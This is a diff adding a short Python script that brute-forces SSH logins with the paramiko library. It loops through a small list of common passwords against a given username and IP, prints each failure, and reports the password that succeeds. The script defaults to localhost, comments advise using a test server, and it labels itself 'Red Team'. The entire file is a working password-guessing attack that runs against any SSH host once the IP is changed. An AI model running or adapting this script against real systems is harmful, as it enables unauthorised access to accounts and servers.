@@ -1,0 +1,31 @@
+import paramiko
+
+# Target SSH server details (use a test server/VM)
+target_ip = "127.0.0.1"  # Replace with your server's IP
+ssh_port = 22
+username = "testuser"  # Replace with the SSH username
+passwords = ["1234", "password", "letmein", "admin123"]  # Common passwords to try
+
+def ssh_brute_force(ip, username, password_list):
+    print("[Red Team] Starting SSH brute-force attempt...")
+    for password in password_list:
+        try:
+            # Set up an SSH client
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            
+            # Attempt to connect
+            ssh.connect(ip, port=ssh_port, username=username, password=password, timeout=1)
+            print(f"[Red Team] Success! Logged in with password: {password}")
+            ssh.close()
+            return True
+        except paramiko.AuthenticationException:
+            print(f"[Red Team] Failed login with password: {password}")
+        except Exception as e:
+            print(f"[Error] Connection error: {e}")
+    
+    print("[Red Team] Brute-force attempt failed. No valid password found.")
+    return False
+
+# Run the brute-force attempt
+ssh_brute_force(target_ip, username, passwords)
